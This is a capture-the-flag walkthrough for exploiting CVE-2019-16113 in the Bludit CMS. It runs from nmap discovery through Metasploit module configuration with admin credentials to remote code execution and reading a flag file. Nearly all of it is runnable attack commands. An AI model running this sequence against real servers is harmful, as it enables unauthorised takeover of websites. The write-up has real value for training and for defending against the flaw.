## Vulnerability Overview
**CVE ID**: CVE-2019-16113  
**CVSS Score**: 8.8 (High)  
**Description**: A remote code execution (RCE) vulnerability in Bludit, a lightweight CMS, allows attackers to upload a malicious .jpg file containing PHP code. This flaw enables unauthenticated or authenticated attackers to execute arbitrary code on the server by bypassing file upload restrictions.

## Objective
Exploit the CVE-2019-16113 vulnerability on a target Bludit instance to gain unauthorized access and retrieve the `/var/www/html/flag.txt` file as part of a capture-the-flag (CTF) challenge.

## Target Information
- **Target IP**: 192.168.5.8
- **Target Port**: 80 (HTTP)
- **Attack Machine IP**: 192.168.0.5
- **Credentials**: Username: `admin`, Password: `password`
- **Objective**: Retrieve the contents of `/var/www/html/flag.txt`

## Exploitation Steps

### Step 1: Network Discovery
Perform a ping scan to identify active hosts in the 192.168.5.0/24 subnet.

```
nmap -sn 192.168.5.0/24
```

### Step 2: Service Enumeration
Enumerate services on the target host (192.168.5.8) to confirm the presence of Bludit.

```
nmap -sV 192.168.5.8
```

### Step 3: Verify Bludit Accessibility
Confirm the Bludit instance is accessible by sending an HTTP request to port 80.

```
curl 192.168.5.8:80
```

### Step 4: Launch Metasploit
Start the Metasploit Framework to access exploit modules.

```
msfconsole
```

### Step 5: Search for Bludit Exploit
Search Metasploit for modules related to Bludit vulnerabilities.

```
search bludit
```

### Step 6: Select Bludit Image Upload Exploit
Choose the Metasploit module for the Bludit image upload RCE vulnerability.

```
use exploit/linux/http/bludit_upload_images_exec
```

### Step 7: Review Module Details
Display information about the selected module to understand its options and requirements.

```
info
```

### Step 8: Configure the Target Host
Set the target host to the Bludit instanceâ€™s IP address.

```
set RHOSTS 192.168.5.8
```

### Step 9: Configure Bludit Username
Set the Bludit admin username for authentication.

```
set BLUDITUSER admin
```

### Step 10: Configure Bludit Password
Set the Bludit admin password for authentication.

```
set BLUDITPASS password
```

### Step 11: Execute the Exploit
Run the exploit to upload a malicious .jpg file containing PHP code and achieve RCE.

```
exploit
```

### Step 12: Retrieve the Flag
Read the contents of the `flag.txt` file located in `/var/www/html`.

```
cat /var/www/html/flag.txt
```

## Final Result
The exploitation was successful, and the flag was retrieved from the target system.
